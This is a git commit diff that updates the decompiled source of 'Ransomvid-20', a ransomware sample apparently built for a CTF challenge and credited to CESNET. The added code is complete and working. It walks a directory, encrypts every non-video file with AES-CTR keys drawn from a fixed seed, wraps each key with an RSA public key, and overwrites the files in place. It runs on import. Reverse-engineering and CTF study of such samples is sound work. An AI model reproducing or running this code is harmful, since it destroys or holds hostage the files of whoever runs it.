1f8390053652a14cf998bf9887eb5aae043e5766
Petr Vaněk <pv@excello.cz>
2020-10-13 11:25:52 +0200

    update

--- ransomware/ransomvid_20.py
+++ ransomware/ransomvid_20.py
@@ -1,109 +1,124 @@
-# Source Generated with Decompyle++
-# File: ransomvid_20.pyc (Python 3.6)
-
-'''
+# uncompyle6 version 3.7.4
+# Python bytecode 3.6 (3379)
+# Decompiled from: Python 3.8.4 (default, Jul 13 2020, 21:16:07) 
+# [GCC 9.3.0]
+# Embedded file name: ransomvid_20.py
+"""
 CTF - Ransomvid-20
-'''
-__author__ = 'Ale\xc5\xa1 Padrta @ CESNET.CZ'
+"""
+__author__ = 'Aleš Padrta @ CESNET.CZ'
 __version__ = '1.0'
-import argparse
-import random
+import argparse, random
 from os import walk
-import pyaes
-import rsa
+import pyaes, rsa
 
 def get_args():
-    '''
-\tCmd line argument parsing (preprocessing)
-\t'''
-    parser = argparse.ArgumentParser('Ransomvid-20 (!!!I can really hurt, if you run me!!!)', **('description',))
-    parser.add_argument('-p', '--path', str, 'Path to encrypt', True, **('type', 'help', 'required'))
-    parser.add_argument('-k', '--keyfile', str, 'The RSA public key', True, **('type', 'help', 'required'))
+    """
+        Cmd line argument parsing (preprocessing)
+        """
+    parser = argparse.ArgumentParser(description='Ransomvid-20 (!!!I can really hurt, if you run me!!!)')
+    parser.add_argument('-p',
+      '--path',
+      type=str,
+      help='Path to encrypt',
+      required=True)
+    parser.add_argument('-k',
+      '--keyfile',
+      type=str,
+      help='The RSA public key',
+      required=True)
     args = parser.parse_args()
-    return (args.path, args.keyfile)
+    return (
+     args.path, args.keyfile)
 
 
 def get_filenames(path):
-    '''
-\tGet list of files to encrypt in given path
-\t'''
+    """
+        Get list of files to encrypt in given path
+        """
     filenames = []
     for root, directories, files in walk(path):
         for name in files:
-            if name.split('.')[-1] not in ('mpeg', 'avi', 'mp4', 'dd'):
+            if name.split('.')[(-1)] not in ('mpeg', 'avi', 'mp4', 'dd'):
                 filenames.append('{}/{}'.format(root, name).replace('\\', '/'))
-    
+
     filenames.sort()
     return filenames
 
 
 def init_random(myseed):
-    '''
-\tInitialize randomization by defining seed
-\t'''
+    """
+        Initialize randomization by defining seed
+        """
     random.seed(myseed)
 
 
 def get_random_aes_key(length):
-    '''
-\tGenerate random AES key
-\t'''
-    key = bytearray((lambda .0: pass)(range(length)))
+    """
+        Generate random AES key
+        """
+    key = bytearray(random.getrandbits(8) for _ in range(length))
     return key
 
 
 def aes_encrypt(data, aeskey):
-    '''
-\tEncrypt/decrypt data by provided AES key
-\t'''
+    """
+        Encrypt/decrypt data by provided AES key
+        """
     aes = pyaes.AESModeOfOperationCTR(aeskey)
     encdata = aes.encrypt(data)
     return encdata
 
 
 def read_rsakey(filename):
-    '''
-\tRead RSA encryption key from file
-\t'''
-    pass
-# WARNING: Decompyle incomplete
+    """
+        Read RSA encryption key from file
+        """
+    with open(filename, mode='rb') as (public_file):
+        key_data = public_file.read()
+    public_key = rsa.PublicKey.load_pkcs1_openssl_pem(key_data)
+    return public_key
 
 
 def rsa_encrypt(data, key):
-    '''
-\tEncrypt data by provided RSA key (public part)
-\t'''
+    """
+        Encrypt data by provided RSA key (public part)
+        """
     encdata = rsa.encrypt(data, key)
     return encdata
 
 
 def read_file(filename):
-    '''
-\tRead content of file to variable
-\t'''
-    pass
-# WARNING: Decompyle incomplete
+    """
+        Read content of file to variable
+        """
+    with open(filename, 'rb') as (fileh):
+        data = fileh.read()
+    return data
 
 
 def write_file(filename, key, data, orig_len):
-    '''
-\tWrite header + encrypted content to file
-\t'''
-    pass
-# WARNING: Decompyle incomplete
+    """
+        Write header + encrypted content to file
+        """
+    with open(filename, 'wb') as (fileh):
+        fileh.write(b'RV20')
+        fileh.write(key)
+        fileh.write(orig_len.to_bytes(8, byteorder='big'))
+        fileh.write(data)
 
 
 def main():
-    '''
-\tMain ransom function
-\t'''
-    (path, rsakeyfile) = get_args()
+    """
+        Main ransom function
+        """
+    path, rsakeyfile = get_args()
     filenames = get_filenames(path)
     print('Found {} files'.format(len(filenames)))
     if filenames:
         for filename in filenames:
             print('  {}'.format(filename))
-        
+
     rsakey = read_rsakey(rsakeyfile)
     init_random(2020)
     for filename in filenames:
@@ -112,6 +127,7 @@ def main():
         enc_data = aes_encrypt(data, aeskey)
         enc_aeskey = rsa_encrypt(aeskey, rsakey)
         write_file('{}'.format(filename), enc_aeskey, enc_data, len(data))
-    
+
 
 main()
+# okay decompiling ransomvid_20.pyc
